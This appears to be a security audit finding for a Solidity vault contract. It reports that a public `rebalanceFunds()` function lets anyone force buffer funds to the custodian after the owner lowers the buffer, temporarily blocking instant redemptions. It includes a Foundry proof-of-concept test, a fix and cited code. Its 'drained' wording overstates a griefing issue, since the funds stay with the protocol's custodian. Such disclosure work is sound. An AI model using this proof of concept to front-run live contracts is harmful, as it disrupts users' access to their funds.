## Title
Unrestricted `rebalanceFunds()` Enables Immediate Liquidity Drainage After Buffer Percentage Changes

## Summary
The `rebalanceFunds()` function in FastAccessVault lacks access control, allowing any address to trigger rebalancing. When the owner drastically reduces `targetBufferPercentageBPS`, an attacker can immediately call `rebalanceFunds()` to force excess DLF transfer to the custodian, causing DOS of instant redemptions and loss of owner control over rebalancing timing.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/protocol/FastAccessVault.sol` - `rebalanceFunds()` function (line 165) and `setTargetBufferPercentage()` function (lines 188-194)

**Intended Logic:** According to the interface documentation, `rebalanceFunds()` should be "Only callable by owner" to allow controlled rebalancing when the owner adjusts buffer parameters. [1](#0-0) 

**Actual Logic:** The `rebalanceFunds()` implementation has no access control modifier - it is publicly callable by any address, as confirmed by test cases. [2](#0-1)  When current balance exceeds target balance, the function immediately transfers excess DLF to the custodian in the same transaction. [3](#0-2) 

**Exploitation Path:**
1. **Initial State Setup**: FastAccessVault holds 50M DLF (50% of 100M AUM) with `targetBufferPercentageBPS = 5000`. Users rely on this liquidity for instant iTRY redemptions via `iTryIssuer.redeemFor()`. [4](#0-3) 

2. **Owner Changes Percentage**: Owner calls `setTargetBufferPercentage(500)` to reduce buffer from 50% to 5%, updating the target calculation. [5](#0-4) 

3. **Attacker Triggers Immediate Rebalance**: Before owner can coordinate with custodian, attacker calls `rebalanceFunds()`. The function calculates new target (5M DLF) and immediately transfers 45M DLF excess to custodian. [6](#0-5) 

4. **DOS of Fast Redemptions**: Users attempting instant redemptions now face insufficient vault balance. Redemptions exceeding remaining 5M DLF must wait for off-chain custodian processing, breaking the "fast access" guarantee. [7](#0-6) 

**Security Property Broken:** The lack of access control violates the documented owner-only access pattern and enables unprivileged actors to force critical liquidity management decisions, causing temporary DOS of instant redemptions.

## Impact Explanation
- **Affected Assets**: DLF collateral held in FastAccessVault (potentially tens of millions), instant redemption availability for all users
- **Damage Severity**: When buffer percentage is drastically reduced (e.g., 50% → 5%), attackers can force immediate transfer of up to 45% of total AUM (45M DLF in a 100M system) to the custodian, reducing available liquidity by 90%
- **User Impact**: All users expecting instant iTRY redemptions are DOS'd until custodian manually processes top-up requests. Protocol's core "fast access" value proposition is temporarily broken.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged EOA or contract (test suite explicitly verifies anyone can call, including labeled "attacker" address) [8](#0-7) 
- **Preconditions**: Owner changes `targetBufferPercentageBPS` to a drastically different value while vault holds funds
- **Execution Complexity**: Single transaction - attacker simply calls `rebalanceFunds()` immediately after detecting percentage change in mempool or after transaction confirmation
- **Frequency**: Exploitable every time owner adjusts buffer percentage downward; can be front-run or sandwich attacked for MEV

## Recommendation

Add access control to `rebalanceFunds()` to match the interface documentation:

```solidity
// In src/protocol/FastAccessVault.sol, function rebalanceFunds, line 165:

// CURRENT (vulnerable):
function rebalanceFunds() external {
    // Anyone can call - no access control
    ...
}

// FIXED:
function rebalanceFunds() external onlyOwner {
    // Only owner can trigger rebalancing after parameter changes
    uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();
    uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);
    uint256 currentBalance = _vaultToken.balanceOf(address(this));

    if (currentBalance < targetBalance) {
        uint256 needed = targetBalance - currentBalance;
        emit TopUpRequestedFromCustodian(address(custodian), needed, targetBalance);
    } else if (currentBalance > targetBalance) {
        uint256 excess = currentBalance - targetBalance;
        if (!_vaultToken.transfer(custodian, excess)) {
            revert CommonErrors.TransferFailed();
        }
        emit ExcessFundsTransferredToCustodian(address(custodian), excess, targetBalance);
    }
}
```

**Alternative Mitigation 1 - Time Delay:** Implement a timelock delay between `setTargetBufferPercentage()` and allowing rebalancing execution, giving owner time to coordinate.

**Alternative Mitigation 2 - Two-Step Process:** Split rebalancing into owner-initiated request and custodian-completed execution for better coordination.

## Proof of Concept

```solidity
// File: test/Exploit_UnrestrictedRebalance.t.sol
// Run with: forge test --match-test test_UnrestrictedRebalanceDrainsLiquidity -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/protocol/FastAccessVault.sol";
import "../src/protocol/iTryIssuer.sol";
import "../test/mocks/MockERC20.sol";
import "../test/mocks/MockIssuerContract.sol";

contract Exploit_UnrestrictedRebalance is Test {
    FastAccessVault vault;
    MockERC20 dlfToken;
    MockIssuerContract issuer;
    
    address owner = address(this);
    address custodian = makeAddr("custodian");
    address attacker = makeAddr("attacker");
    address user = makeAddr("user");
    
    uint256 constant INITIAL_AUM = 100_000_000e18; // 100M DLF
    uint256 constant INITIAL_BUFFER_BPS = 5000; // 50%
    uint256 constant INITIAL_VAULT_BALANCE = 50_000_000e18; // 50M DLF
    
    function setUp() public {
        // Deploy mocks
        dlfToken = new MockERC20("DLF", "DLF");
        issuer = new MockIssuerContract(INITIAL_AUM);
        
        // Deploy vault with 50% buffer
        vault = new FastAccessVault(
            address(dlfToken),
            address(issuer),
            custodian,
            INITIAL_BUFFER_BPS,
            1000e18, // minimum balance
            owner
        );
        
        // Fund vault with 50M DLF (properly balanced at 50%)
        dlfToken.mint(address(vault), INITIAL_VAULT_BALANCE);
        
        // Verify initial balanced state
        assertEq(vault.getAvailableBalance(), INITIAL_VAULT_BALANCE, "Initial balance");
        assertEq(vault.getTargetBufferPercentage(), INITIAL_BUFFER_BPS, "Initial percentage");
    }
    
    function test_UnrestrictedRebalanceDrainsLiquidity() public {
        // SETUP: Users expect 50M DLF liquidity for instant redemptions
        uint256 userRedemptionAmount = 10_000_000e18; // User wants to redeem 10M DLF
        assertTrue(vault.getAvailableBalance() >= userRedemptionAmount, "Sufficient liquidity initially");
        
        // EXPLOIT STEP 1: Owner legitimately reduces buffer percentage from 50% to 5%
        vm.prank(owner);
        vault.setTargetBufferPercentage(500); // 5%
        
        // New target should be 100M * 5% = 5M DLF
        // But vault still holds 50M DLF
        
        // EXPLOIT STEP 2: Attacker (or anyone) immediately calls rebalanceFunds
        // This can be front-run or executed right after owner's transaction
        uint256 custodianBalanceBefore = dlfToken.balanceOf(custodian);
        uint256 vaultBalanceBefore = vault.getAvailableBalance();
        
        vm.prank(attacker); // Any address can call - no access control!
        vault.rebalanceFunds();
        
        // VERIFY: Vault drained 45M DLF to custodian immediately
        uint256 vaultBalanceAfter = vault.getAvailableBalance();
        uint256 custodianBalanceAfter = dlfToken.balanceOf(custodian);
        uint256 transferred = custodianBalanceAfter - custodianBalanceBefore;
        
        assertEq(transferred, 45_000_000e18, "Vulnerability confirmed: 45M DLF drained by unprivileged attacker");
        assertEq(vaultBalanceAfter, 5_000_000e18, "Vault now only has 5M DLF");
        
        // IMPACT: User's 10M redemption now FAILS - insufficient liquidity
        assertLt(vaultBalanceAfter, userRedemptionAmount, "DOS: User redemption blocked");
        
        console.log("=== EXPLOITATION SUCCESS ===");
        console.log("Attacker address:", attacker);
        console.log("DLF drained to custodian:", transferred / 1e18, "DLF");
        console.log("Vault liquidity reduced by:", (vaultBalanceBefore - vaultBalanceAfter) * 100 / vaultBalanceBefore, "%");
        console.log("Fast redemptions DOS'd: User needs", userRedemptionAmount / 1e18, "DLF but only", vaultBalanceAfter / 1e18, "available");
    }
}
```

## Notes

The public access to `rebalanceFunds()` is confirmed by test cases as intentional behavior [9](#0-8) , creating a discrepancy with the interface documentation that states "Only callable by owner". This design choice removes owner control over rebalancing timing after parameter changes, enabling griefing attacks and DOS of instant redemptions when buffer percentages are adjusted. The vulnerability is particularly severe because excess transfers happen automatically and immediately in the same transaction, giving the owner no grace period to coordinate with the custodian or notify users.

### Citations

**File:** src/protocol/interfaces/IFastAccessVault.sol (L140-145)
```text
     * @notice Rebalance the vault to match target buffer levels
     * @dev Only callable by owner. Requests top-up from custodian if under target,
     *      or transfers excess to custodian if over target
     *
     */
    function rebalanceFunds() external;
```

**File:** src/protocol/FastAccessVault.sol (L165-181)
```text
    function rebalanceFunds() external {
        uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();
        uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);
        uint256 currentBalance = _vaultToken.balanceOf(address(this));

        if (currentBalance < targetBalance) {
            uint256 needed = targetBalance - currentBalance;
            // Emit event for off-chain custodian to process
            emit TopUpRequestedFromCustodian(address(custodian), needed, targetBalance);
        } else if (currentBalance > targetBalance) {
            uint256 excess = currentBalance - targetBalance;
            if (!_vaultToken.transfer(custodian, excess)) {
                revert CommonErrors.TransferFailed();
            }
            emit ExcessFundsTransferredToCustodian(address(custodian), excess, targetBalance);
        }
    }
```

**File:** src/protocol/FastAccessVault.sol (L188-194)
```text
    function setTargetBufferPercentage(uint256 newTargetPercentageBPS) external onlyOwner {
        _validateBufferPercentageBPS(newTargetPercentageBPS);

        uint256 oldPercentageBPS = targetBufferPercentageBPS;
        targetBufferPercentageBPS = newTargetPercentageBPS;
        emit TargetBufferPercentageUpdated(oldPercentageBPS, newTargetPercentageBPS);
    }
```

**File:** src/protocol/iTryIssuer.sol (L354-366)
```text
        uint256 bufferBalance = liquidityVault.getAvailableBalance();

        if (bufferBalance >= grossDlfAmount) {
            // Buffer has enough - serve from buffer
            _redeemFromVault(recipient, netDlfAmount, feeAmount);

            fromBuffer = true;
        } else {
            // Buffer insufficient - serve from custodian
            _redeemFromCustodian(recipient, netDlfAmount, feeAmount);

            fromBuffer = false;
        }
```

**File:** test/FastAccessVault.t.sol (L825-840)
```text
    function test_rebalanceFunds_whenCalledByAnyone_succeeds() public {
        _setupVaultWithBalance(100_000e18);

        // Call from different addresses
        vm.prank(user1);
        vault.rebalanceFunds();

        vm.prank(attacker);
        vault.rebalanceFunds();

        vm.prank(custodian);
        vault.rebalanceFunds();

        // Should not revert
        assertTrue(true, "Anyone should be able to call rebalanceFunds");
    }
```

**File:** test/FastAccessVault.t.sol (L1533-1542)
```text
    function testFuzz_rebalanceFunds_publicAccess(address caller) public {
        vm.assume(caller != address(0));
        vm.assume(caller.code.length == 0); // EOA only

        vm.prank(caller);
        vault.rebalanceFunds();

        // Should not revert
        assertTrue(true, "Anyone can call rebalanceFunds");
    }
```
